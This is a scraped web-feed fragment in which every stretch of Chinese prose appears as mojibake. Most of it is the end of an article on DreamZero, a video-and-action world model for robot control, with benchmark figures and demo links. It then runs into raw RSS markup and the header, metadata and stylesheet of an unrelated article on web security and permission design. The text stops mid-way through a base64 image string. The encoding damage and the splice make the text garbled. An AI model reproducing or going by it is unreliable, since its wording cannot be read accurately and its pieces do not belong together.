<p>ä¸åŒäºä¼ ç»Ÿçš„ VLA æ¨¡å‹ï¼ŒWAM é€šè¿‡è”åˆé¢„æµ‹æœªæ¥ä¸–ç•ŒçŠ¶æ€ä¸åŠ¨ä½œæ¥å­¦ä¹ ç‰©ç†åŠ¨åŠ›å­¦ï¼Œå¹¶ä»¥è§†é¢‘ä½œä¸ºä¸–ç•Œæ¼”åŒ–çš„ç¨ å¯†è¡¨ç¤ºã€‚é€šè¿‡å¯¹è§†é¢‘ä¸åŠ¨ä½œçš„è”åˆå»ºæ¨¡ï¼ŒDreamZero èƒ½å¤Ÿä»å¼‚æ„æœºå™¨äººæ•°æ®ä¸­é«˜æ•ˆå­¦ä¹ å¤šæ ·åŒ–æŠ€èƒ½ï¼Œè€Œä¸ä¾èµ–é‡å¤ç¤ºèŒƒã€‚åœ¨çœŸå®æœºå™¨äººå®éªŒä¸­ï¼Œç›¸æ¯”æœ€å…ˆè¿›çš„ VLAï¼ŒDreamZero åœ¨æ–°ä»»åŠ¡ä¸æ–°ç¯å¢ƒçš„æ³›åŒ–ä¸Šå®ç°äº†è¶…è¿‡ 2Ã— çš„æå‡ã€‚</p>
<p>è‡³å…³é‡è¦çš„æ˜¯ï¼Œé€šè¿‡æ¨¡å‹ä¸ç³»ç»Ÿå±‚é¢çš„ä¼˜åŒ–ï¼Œç ”ç©¶å›¢é˜Ÿè®©ä¸€ä¸ª 140 äº¿å‚æ•°çš„è‡ªå›å½’è§†é¢‘æ‰©æ•£æ¨¡å‹å®ç°äº† 7Hz çš„å®æ—¶é—­ç¯æ§åˆ¶ã€‚æ­¤å¤–ï¼Œç ”ç©¶å›¢é˜Ÿå±•ç¤ºäº†ä¸¤ç§è·¨å…·èº«è¿ç§»èƒ½åŠ›ï¼šä»…ä½¿ç”¨ 10â€“20 åˆ†é’Ÿçš„äººç±»æˆ–å…¶ä»–æœºå™¨äººçº¯è§†é¢‘ç¤ºèŒƒï¼Œå³å¯åœ¨æœªè§ä»»åŠ¡ä¸Šå¸¦æ¥ è¶…è¿‡ 42% çš„æ€§èƒ½æå‡ã€‚æ›´ä»¤äººæƒŠè®¶çš„æ˜¯ï¼ŒDreamZero åªéœ€ 30 åˆ†é’Ÿçš„ ã€Œç©è€æ•°æ®ã€ï¼Œå°±èƒ½é€‚é…åˆ°å…¨æ–°çš„æœºå™¨äººï¼ŒåŒæ—¶ä»ä¿æŒé›¶æ ·æœ¬æ³›åŒ–èƒ½åŠ›ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edca65dba74240e192c3c2069bc6207d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=OzU5yaZ2J5zMOOqIgvTgkznyjZY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>DreamZero æ•´ä½“æ¦‚è§ˆã€‚</p>
<p>å›¾ä¸­å±•ç¤ºäº† DreamZero é€šè¿‡è”åˆé¢„æµ‹è§†é¢‘ä¸åŠ¨ä½œï¼Œä¸–ç•ŒåŠ¨ä½œæ¨¡å‹ç»§æ‰¿äº†å…³äºä¸–ç•Œç‰©ç†è§„å¾‹çš„å…ˆéªŒï¼Œä»è€Œå®ç°äº†ï¼š</p>
<p>1ï¼‰ä»å¤šæ ·ã€éé‡å¤çš„æ•°æ®ä¸­é«˜æ•ˆå­¦ä¹ ï¼›</p>
<p>2ï¼‰åœ¨å¼€æ”¾ä¸–ç•Œåœºæ™¯ä¸­çš„å¼ºæ³›åŒ–èƒ½åŠ›ï¼›</p>
<p>3ï¼‰ä»…ä¾èµ–çº¯è§†é¢‘æ•°æ®å³å¯å®Œæˆè·¨å…·èº«å­¦ä¹ ï¼›</p>
<p>4ï¼‰å¯¹æ–°æœºå™¨äººçš„å°‘æ ·æœ¬å¿«é€Ÿé€‚é…ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/571c2c73f03c4916a4ee450f3b0d8339~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=Aq9480MKyrHAWr8Ydn8EYUBfOpg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>DreamZero çš„æ¨¡å‹æ¶æ„ã€‚</p>
<p>å¤§å¤šçš„é¢„è®­ç»ƒçš„è§†é¢‘æ‰©æ•£æ¨¡å‹å‡­å€Ÿæ¥è‡ªç½‘é¡µè§„æ¨¡æ•°æ®çš„ä¸°å¯Œæ—¶ç©ºå…ˆéªŒï¼Œæˆä¸ºæ„å»ºæœºå™¨äººç­–ç•¥çš„ç†æƒ³éª¨å¹²ç½‘ç»œã€‚ç„¶è€Œï¼Œå°†è¿™ç±»æ¨¡å‹è½¬åŒ–ä¸ºé«˜æ•ˆçš„ä¸–ç•ŒåŠ¨ä½œæ¨¡å‹ä»é¢ä¸´å…³é”®æŒ‘æˆ˜ï¼š</p>
<p>1ï¼‰è§†é¢‘â€“åŠ¨ä½œå¯¹é½ï¼šè”åˆé¢„æµ‹è§†é¢‘ä¸åŠ¨ä½œè¦æ±‚å¯¹è§†è§‰æœªæ¥ä¸ç”µæœºæŒ‡ä»¤è¿›è¡Œç´§å¯†è€¦åˆï¼Œä½†å¦‚æœåªæ˜¯ç®€å•åœ°å°†ç‹¬ç«‹çš„è§†é¢‘å¤´ä¸åŠ¨ä½œæ‹¼æ¥ï¼Œå¾€å¾€ä¼šå¯¼è‡´äºŒè€…å¯¹é½å¤±æ•ˆï¼›</p>
<p>2ï¼‰æ¶æ„è®¾è®¡ï¼šå°šä¸æ¸…æ¥šåŒå‘æ¶æ„è¿˜æ˜¯è‡ªå›å½’æ¶æ„æ›´é€‚åˆ WAMï¼Œè¿™å…³ç³»åˆ°å¤šæ¨¡æ€å¯¹é½ã€è¯¯å·®ç´¯ç§¯ä»¥åŠæ¨ç†æ•ˆç‡ç­‰å…³é”®é—®é¢˜ï¼›</p>
<p>3ï¼‰å®æ—¶æ¨ç†ï¼šè§†é¢‘æ‰©æ•£æ¨¡å‹éœ€è¦åœ¨é«˜ç»´æ½œç©ºé—´ä¸­è¿›è¡Œå¤šæ­¥è¿­ä»£å»å™ªï¼Œä½¿å…¶åœ¨é—­ç¯æ§åˆ¶åœºæ™¯ä¸‹é€Ÿåº¦è¿‡æ…¢ã€éš¾ä»¥å®ç”¨ã€‚</p>
<p>ä¸ºæ­¤ï¼ŒDreamZero é€šè¿‡æ¨¡å‹è®¾è®¡é€‰æ‹©æœ‰æ•ˆåº”å¯¹äº†ä¸Šè¿°æŒ‘æˆ˜ã€‚</p>
<p>æ¨¡å‹æ¥æ”¶ä¸‰ç±»è¾“å…¥ï¼šè§†è§‰ä¸Šä¸‹æ–‡ï¼ˆé€šè¿‡ VAE ç¼–ç ï¼‰ã€è¯­è¨€æŒ‡ä»¤ï¼ˆé€šè¿‡æ–‡æœ¬ç¼–ç å™¨ï¼‰ã€ä»¥åŠæœ¬ä½“æ„ŸçŸ¥çŠ¶æ€ï¼ˆé€šè¿‡çŠ¶æ€ç¼–ç å™¨ï¼‰ã€‚è¿™äº›è¾“å…¥éšåè¢«é€å…¥ä¸€ä¸ªåŸºäº Flow Matching çš„è‡ªå›å½’ DiT ä¸»å¹²ç½‘ç»œï¼Œç”±å…¶è”åˆé¢„æµ‹æœªæ¥çš„è§†é¢‘å¸§ä¸åŠ¨ä½œï¼Œå¹¶é€šè¿‡å„è‡ªç‹¬ç«‹çš„è§£ç å™¨è¾“å‡ºç»“æœã€‚</p>
<p>åœ¨è®­ç»ƒé˜¶æ®µï¼Œæ¨¡å‹ä»¥åˆ†å—ï¼ˆchunkï¼‰çš„æ–¹å¼å·¥ä½œï¼šåœ¨ç»™å®šå¹²å‡€è§†é¢‘ä¸Šä¸‹æ–‡ä½œä¸ºæ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œå¯¹åŠ å™ªçš„è§†é¢‘ä¸åŠ¨ä½œæ½œå˜é‡è¿›è¡Œå»å™ªã€‚åœ¨æ¨ç†é˜¶æ®µï¼Œæ¨¡å‹çš„é¢„æµ‹ä¼šä»¥å¼‚æ­¥æ–¹å¼åœ¨çœŸå®ä¸–ç•Œä¸­æ‰§è¡Œï¼ŒåŒæ—¶å°†çœŸå®è§‚æµ‹ç»“æœå›çŒåˆ° KV cache ä¸­ï¼Œä»¥é˜²æ­¢è¯¯å·®éšæ—¶é—´ç´¯ç§¯ã€‚</p>
<p>å®éªŒç»“æœ</p>
<p>ç ”ç©¶å›¢é˜Ÿåœ¨ å…­ç§è®¾ç½®ä¸‹å±•ç¤ºäº† DreamZero çš„èƒ½åŠ› â€”â€” å…¶ä¸­ äº”ç§ç”¨äºæµ‹è¯•æ³›åŒ–ï¼Œä¸€ç§ç”¨äºå®æ—¶éƒ¨ç½²ã€‚</p>
<p>ç›¸å…³çš„è®­ç»ƒæ•°æ®ä»¥åŠå®éªŒç»“æœçš„æ¼”ç¤ºå¯ä»¥å‚è€ƒä»¥ä¸‹é“¾æ¥ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdreamzero0.github.io%2Fevals_gallery%2F" target="_blank" title="https://dreamzero0.github.io/evals_gallery/" ref="nofollow noopener noreferrer">dreamzero0.github.io/evals_galleâ€¦</a></p>
<p>AgiBot é¢„è®­ç»ƒï¼šå·²è§ &amp; æœªè§ä»»åŠ¡</p>
<p>ç ”ç©¶å›¢é˜Ÿå¯¹é¢„è®­ç»ƒæ¨¡å‹è¿›è¡Œå¼€ç®±å³ç”¨è¯„æµ‹ï¼šä»»åŠ¡æ¥è‡ªé¢„è®­ç»ƒåˆ†å¸ƒï¼Œä½†åœ¨æœªè§å¯¹è±¡çš„æ–°ç¯å¢ƒä¸­è¿›è¡Œé›¶æ ·æœ¬æµ‹è¯•ã€‚DreamZeroï¼ˆä¹ŸåŒ…å«ä»é›¶è®­ç»ƒç‰ˆæœ¬ï¼‰å–å¾— 62.2% çš„å¹³å‡ä»»åŠ¡è¿›åº¦ï¼Œç›¸æ¯”æœ€ä½³é¢„è®­ç»ƒ VLA åŸºçº¿ï¼ˆ27.4%ï¼‰æå‡ è¶…è¿‡ 2Ã—ã€‚ä»é›¶è®­ç»ƒçš„ VLA å‡ ä¹ä¸ºé›¶ï¼›é¢„è®­ç»ƒ VLA æœ‰ä¸€å®šè¿›å±•ï¼Œä½†å¹…åº¦æœ‰é™ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd30d0cdef3e4411b1ea189ff37a1710~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=C0sqviId%2Fj1CS5NqxeGOvHoW%2B2U%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯¹äºè®­ç»ƒä¸­å®Œå…¨æœªå‡ºç°çš„ä»»åŠ¡ï¼ˆå¦‚è§£é‹å¸¦ã€æ¡æ‰‹ï¼‰ï¼ŒDreamZero ä»è¾¾åˆ° 39.5% çš„ä»»åŠ¡è¿›åº¦ï¼Œè€Œ VLA å†æ¬¡è¡¨ç°åƒåŠ›ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé¢„è®­ç»ƒ VLA åœ¨æœªè§ä»»åŠ¡ä¸Šçš„æœ‰é™è¿›å±•ï¼Œä¸»è¦æºäºå…¶æ— è®ºæŒ‡ä»¤å¦‚ä½•éƒ½å€¾å‘äºæ‰§è¡Œ ã€ŒæŠ“å– - æ”¾ç½®ã€ çš„é»˜è®¤åŠ¨ä½œï¼Œæ˜¾ç¤ºå…¶è¿‡æ‹Ÿåˆäºä¸»å¯¼è®­ç»ƒè¡Œä¸ºï¼Œè€ŒéçœŸæ­£ç†è§£æ–°ä»»åŠ¡è¯­ä¹‰ã€‚ç ”ç©¶å›¢é˜Ÿåœ¨ 4 å°æœºå™¨äººã€ä¸åŒç¯å¢ƒä¸ç‰©ä½“ä¸Šï¼Œå¯¹æ¯ä¸ªæ£€æŸ¥ç‚¹è¿›è¡Œäº† 80 æ¬¡ rolloutsã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5920e95578ce4d779c14ed67a56ab1e0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=x5a7Zhxi%2BnMRCVzieDAjr0V6FFQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>DROIDï¼šå·²è§ä»»åŠ¡ &amp; æœªè§åŠ¨ä½œ</p>
<p>ä¸ºéªŒè¯åœ¨å…¬å¼€æ•°æ®ä¸Šçš„æ•ˆæœï¼Œç ”ç©¶å›¢é˜Ÿåœ¨ DROIDï¼ˆæœ€å¼‚æ„çš„å¼€æºæœºå™¨äººæ•°æ®é›†ä¹‹ä¸€ï¼‰ä¸Šè®­ç»ƒ DreamZeroï¼Œå¹¶è¯„æµ‹ 20 ä¸ªå·²è§ä»»åŠ¡ä¸ 20 ä¸ªæœªè§åŠ¨è¯ä»»åŠ¡ï¼ˆDROID ä¸­æœªå‡ºç°çš„åŠ¨ä½œï¼‰ã€‚DreamZero æ˜¾è‘—ä¼˜äºé¢„è®­ç»ƒåŸºçº¿ï¼Œåœ¨æœªè§åŠ¨è¯ä¸Šå–å¾— 49% çš„ä»»åŠ¡è¿›åº¦ï¼Œè€Œæœ€å…ˆè¿›çš„ VLA ä»…ä¸º 25â€“32%ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c86a69b37854427b9042a54d63f1c4d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771229853&amp;x-signature=RAToWYahXver8EvpzVeGHbqe%2B9E%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åè®­ç»ƒï¼šåˆ†å¸ƒå¤–æ³›åŒ–</p>
<p>æœ¬éƒ¨åˆ†ç ”ç©¶ WAM åœ¨ä»»åŠ¡ç‰¹å®šå¾®è°ƒåæ˜¯å¦ä»ä¿ç•™æ³›åŒ–èƒ½åŠ›ã€‚ç ”ç©¶å›¢é˜Ÿåœ¨ ä¸‰é¡¹ä¸‹æ¸¸ä»»åŠ¡ä¸Šè¿›è¡Œåè®­ç»ƒï¼šå è¡¬è¡«ã€è£…æ°´æœã€æ¸…ç†é¤æ¡Œã€‚DreamZero åœ¨ä¸‰é¡¹ä»»åŠ¡ä¸Šå‡è¡¨ç°æ›´å¼ºï¼Œè¡¨æ˜åè®­ç»ƒåä»ä¿æŒç¯å¢ƒæ³›åŒ–èƒ½åŠ›ã€‚</p>
<p>è·¨å…·èº«è¿ç§»</p>
<p>ä»…ç”¨ 30 åˆ†é’Ÿçš„ç©è€æ•°æ®ï¼ˆ55 æ¡è½¨è¿¹ï¼‰ï¼ŒDreamZero å³å¯é€‚é… YAM æœºå™¨äººï¼Œå¹¶å¯¹å—ç“œã€æ³°è¿ªç†Šã€çº¸è¢‹ç­‰æ–°ç‰©ä½“å®ç°é›¶æ ·æœ¬æ³›åŒ–ï¼ŒåŒæ—¶å±•ç°å‡ºå¼ºå¤§çš„è¯­è¨€æŒ‡ä»¤éµå¾ªèƒ½åŠ›ã€‚æ¥è‡ª AgiBot é¢„è®­ç»ƒçš„çŸ¥è¯†å¯ç›´æ¥è¿ç§»ï¼Œæ— éœ€å¤§è§„æ¨¡é‡è®­ã€‚è¿™æ˜¯ç›®å‰æ•ˆç‡æœ€é«˜çš„å…·èº«è¿ç§»ï¼šä»¥å¾€éœ€è¦æ•°ç™¾å°æ—¶ç¤ºèŒƒçš„å·¥ä½œï¼Œèƒ½å¤Ÿåœ¨ 30 åˆ†é’Ÿå†…å®Œæˆï¼ˆæœªä½¿ç”¨ä»»ä½•å…¶ä»– YAM æ•°æ®ï¼‰ã€‚</p>
<p>äº¤äº’å¼æç¤º</p>
<p>æœºå™¨äººåŸºç¡€æ¨¡å‹çš„ ã€Œæç¤ºæ—¶ä»£ã€ å·²ç»åˆ°æ¥ã€‚ç ”ç©¶å›¢é˜Ÿå±•ç¤ºäº†äº¤äº’å¼æç¤ºçš„å®æˆ˜ï¼šå¸¦ç€æœºå™¨äººèµ°åˆ°ä¸åŒåœ°æ–¹ï¼Œè®©äººä»¬ç›´æ¥ç”¨è¯­è¨€æå‡ºæ–°ä»»åŠ¡ã€‚æœºå™¨äººèƒ½å¤Ÿå®Œæˆå¤šç§ä»¤äººæƒŠå–œçš„æ“ä½œã€‚</p>
<p>å®æ—¶æ¨ç†Â </p>
<p>é€šè¿‡æ¨¡å‹ã€ç³»ç»Ÿä¸å®ç°å±‚é¢çš„ä¼˜åŒ–ï¼ŒDreamZero å®ç°äº† æ¯ä¸ªåŠ¨ä½œå— 150ms çš„å®æ—¶æ¨ç†ï¼Œæ”¯æŒ 7Hz é—­ç¯æ§åˆ¶ã€‚ç»“åˆå¼‚æ­¥æ¨ç†ä¸åŠ¨ä½œå—å¹³æ»‘ï¼Œæ‰§è¡Œè¿‡ç¨‹æ›´åŠ æµç•…ã€å“åº”è¿…é€Ÿã€‚ç ”ç©¶å›¢é˜Ÿå¯¹æ¯”äº† 16 / 4 / 1 ä¸ªæ‰©æ•£æ­¥æ•°çš„æ•ˆæœï¼šæ­¥æ•°è¶Šå°‘å»¶è¿Ÿè¶Šä½ï¼Œè€Œ DreamZero-Flash å³ä¾¿åœ¨å•æ­¥æ¨ç†ä¸‹ä¹Ÿèƒ½ä¿æŒæ€§èƒ½ã€‚ç ”ç©¶å›¢é˜Ÿè¿˜å±•ç¤ºäº†åŠ¨ä½œå—å¹³æ»‘ä¸å¼‚æ­¥æ¨ç†å¯¹æ‰§è¡Œè´¨é‡çš„å½±å“ã€‚</p>
<p>DreamZero (16 diffusion step) + async &amp; action chunk smoothing</p>
<p>é›¶æ ·æœ¬æ³›åŒ–èƒ½èµ°å¤šè¿œï¼Ÿ ç ”ç©¶å›¢é˜ŸæŒç»­å¯¹ DreamZero è¿›è¡Œå‹åŠ›æµ‹è¯•ï¼šåœ¨ä»æœªè®­ç»ƒè¿‡çš„ä»»åŠ¡ã€ä»æœªè§è¿‡çš„ç¯å¢ƒä¸­æ¢ç´¢èƒ½åŠ›ã€‚ä»æ‰‡æ±‰å ¡ã€æŒ‰ç”µæ¢¯æŒ‰é’®ï¼Œåˆ°æ•²æœ¨ç´ã€æ‘‡é“ƒé¼“ï¼Œä¸æ–­æ¶Œç°å‡ºä»¤äººæƒŠè®¶çš„æ–°èƒ½åŠ›ã€‚</p>
<p>DreamZero åªæ˜¯å¼€å§‹ â€”â€” å®ƒä»£è¡¨äº†åŸºäºè§†é¢‘ä¸–ç•Œæ¨¡å‹çš„æ–°ä¸€ä»£æœºå™¨äººåŸºç¡€æ¨¡å‹æµªæ½®ã€‚</p>
<p>æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…åŸè®ºæ–‡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Web å®‰å…¨ä¸åç¼–è¯‘æºç ä¸‹çš„æƒé™è®¾è®¡ï¼šæ„å»ºå‰åç«¯ä¸€ä½“çš„ä¿¡ä»»é˜²çº¿]]></title>    <link>https://juejin.cn/post/7603771025856561203</link>    <guid>https://juejin.cn/post/7603771025856561203</guid>    <pubDate>2026-02-08T06:35:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603771025856561203" data-draft-id="7603674653153787913" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Web å®‰å…¨ä¸åç¼–è¯‘æºç ä¸‹çš„æƒé™è®¾è®¡ï¼šæ„å»ºå‰åç«¯ä¸€ä½“çš„ä¿¡ä»»é˜²çº¿"/> <meta itemprop="keywords" content="å‰ç«¯,å®‰å…¨,ç¼–è¯‘åŸç†"/> <meta itemprop="datePublished" content="2026-02-08T06:35:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Web å®‰å…¨ä¸åç¼–è¯‘æºç ä¸‹çš„æƒé™è®¾è®¡ï¼šæ„å»ºå‰åç«¯ä¸€ä½“çš„ä¿¡ä»»é˜²çº¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T06:35:50.000Z" title="Sun Feb 08 2026 06:35:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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